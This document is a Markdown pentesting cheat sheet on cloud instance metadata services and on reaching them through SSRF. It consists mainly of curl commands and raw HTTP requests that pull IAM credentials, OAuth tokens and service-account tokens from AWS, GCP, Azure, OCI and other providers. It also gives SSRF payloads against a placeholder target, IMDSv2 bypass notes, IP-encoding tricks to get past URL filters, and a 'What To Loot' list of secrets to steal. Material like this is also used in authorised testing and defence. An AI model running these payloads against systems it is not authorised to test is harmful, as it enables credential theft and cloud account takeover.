# Metadata / IMDS

## Why 169.254.169.254

`169.254.0.0/16` is link-local (RFC 3927), not routable from the internet. Cloud providers expose an instance metadata service there so workloads can discover identity, region, user-data, and temporary credentials.

The same IP is used by several providers. Differentiate by path, required header, and error format.

## Provider Matrix

| Provider | Base URL | Required header | Credentials |
| --- | --- | --- | --- |
| AWS EC2 | `http://169.254.169.254/latest/meta-data/` | IMDSv2 token | `iam/security-credentials/<role>` |
| AWS IMDS IPv6 | `http://[fd00:ec2::254]/latest/meta-data/` | IMDSv2 token | same |
| AWS ECS | `http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` | none | task role |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` | `Metadata-Flavor: Google` | `instance/service-accounts/default/token` |
| Azure | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` | `Metadata: true` | `metadata/identity/oauth2/token` |
| OCI | `http://169.254.169.254/opc/v2/instance/` | `Authorization: Bearer Oracle` | `opc/v2/identity/` |
| DigitalOcean | `http://169.254.169.254/metadata/v1.json` | none | none |
| Alibaba | `http://100.100.100.200/latest/meta-data/` | none | `ram/security-credentials/` |
| OpenStack | `http://169.254.169.254/latest/meta-data/` | often none | `latest/meta-data/` |

## AWS

### IMDSv1

```bash
curl -s http://169.254.169.254/latest/meta-data/
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
```

### IMDSv2

```bash
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/
```

`/latest/api/token` only accepts `PUT`. A `GET` returns `405`. A metadata `GET` without the token returns `401` when IMDSv2 is required.

### Useful paths

```text
/latest/meta-data/
/latest/meta-data/ami-id
/latest/meta-data/hostname
/latest/meta-data/instance-id
/latest/meta-data/instance-type
/latest/meta-data/local-ipv4
/latest/meta-data/public-ipv4
/latest/meta-data/placement/region
/latest/meta-data/placement/availability-zone
/latest/meta-data/security-groups
/latest/meta-data/iam/info
/latest/meta-data/iam/security-credentials/
/latest/meta-data/iam/security-credentials/<role>
/latest/meta-data/identity-credentials/ec2/info
/latest/user-data
```

### ECS task role

```bash
curl -s "http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}"
curl -s "$AWS_CONTAINER_CREDENTIALS_FULL_URI" \
  -H "Authorization: $AWS_CONTAINER_AUTHORIZATION_TOKEN"
```

### EKS pod identity / IRSA

```bash
echo "$AWS_CONTAINER_CREDENTIALS_FULL_URI"
cat "$AWS_CONTAINER_AUTHORIZATION_TOKEN_FILE"
curl -s "$AWS_CONTAINER_CREDENTIALS_FULL_URI" \
  -H "Authorization: $(cat "$AWS_CONTAINER_AUTHORIZATION_TOKEN_FILE")"
```

## GCP

```bash
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=json"
```

Useful paths:

```text
/project/project-id
/project/numeric-project-id
/instance/name
/instance/zone
/instance/attributes/
/instance/service-accounts/
/instance/service-accounts/default/email
/instance/service-accounts/default/token
```

Token response is JSON with `access_token`, `expires_in`, `token_type`.

## Azure

```bash
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
```

Managed identity token:

```bash
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/"

curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net"
```

Without `Metadata: true`, Azure usually returns `400`.

## OCI

```bash
curl -s -H "Authorization: Bearer Oracle" \
  http://169.254.169.254/opc/v2/instance/

curl -s -H "Authorization: Bearer Oracle" \
  http://169.254.169.254/opc/v2/identity/
```

## DigitalOcean

```bash
curl -s http://169.254.169.254/metadata/v1.json
curl -s http://169.254.169.254/metadata/v1/id
curl -s http://169.254.169.254/metadata/v1/hostname
```

## Alibaba Cloud

```bash
curl -s http://100.100.100.200/latest/meta-data/
curl -s http://100.100.100.200/latest/meta-data/ram/security-credentials/
```

## SSRF To Metadata

Basic probes:

```text
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/api/token
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://100.100.100.200/latest/meta-data/
```

If the sink forwards method and headers, IMDSv2 and header-gated providers are reachable:

```http
PUT /fetch?url=http://169.254.169.254/latest/api/token HTTP/1.1
Host: TARGET
X-aws-ec2-metadata-token-ttl-seconds: 21600
```

```http
GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1
Host: TARGET
X-aws-ec2-metadata-token: <token>
```

For GCP and Azure, forward the provider header:

```http
GET /fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token HTTP/1.1
Metadata-Flavor: Google
```

```http
GET /fetch?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/ HTTP/1.1
Metadata: true
```

If headers are not forwarded, look for an SSRF sink in a cloud-native service that adds them automatically, or use the provider's alternate flow.

### IMDSv2 bypass notes

```text
- The sink must forward PUT and the token TTL header for the token request.
- The sink must forward the token header for subsequent metadata requests.
- Redirects usually keep the original method, so a GET-only sink cannot be upgraded to PUT by a 307.
- ECS task metadata on 169.254.170.2 often needs no token.
- GCP and Azure need their provider header, not an AWS token.
```

### Common SSRF parser tricks

```text
http://169.254.169.254/
http://[::ffff:169.254.169.254]/
http://2852039166/
http://0xA9FEA9FE/
http://169.254.169.254.nip.io/
http://metadata.google.internal/
```

## What To Loot

```text
instance id / region / account id
IAM role name and temporary credentials
user-data (startup scripts often contain secrets)
instance identity document
ECS task role credentials
service account token / email / scopes
managed identity token / client id / tenant id
K8s service account token and namespace
```

## References

* [AWS IMDS documentation](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)
* [GCP metadata documentation](https://cloud.google.com/compute/docs/metadata/overview)
* [Azure IMDS documentation](https://learn.microsoft.com/azure/virtual-machines/instance-metadata-service)
* [HackTricks Cloud Metadata](https://book.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-services/aws-ec2-ebs-and-elastic-ip.html)
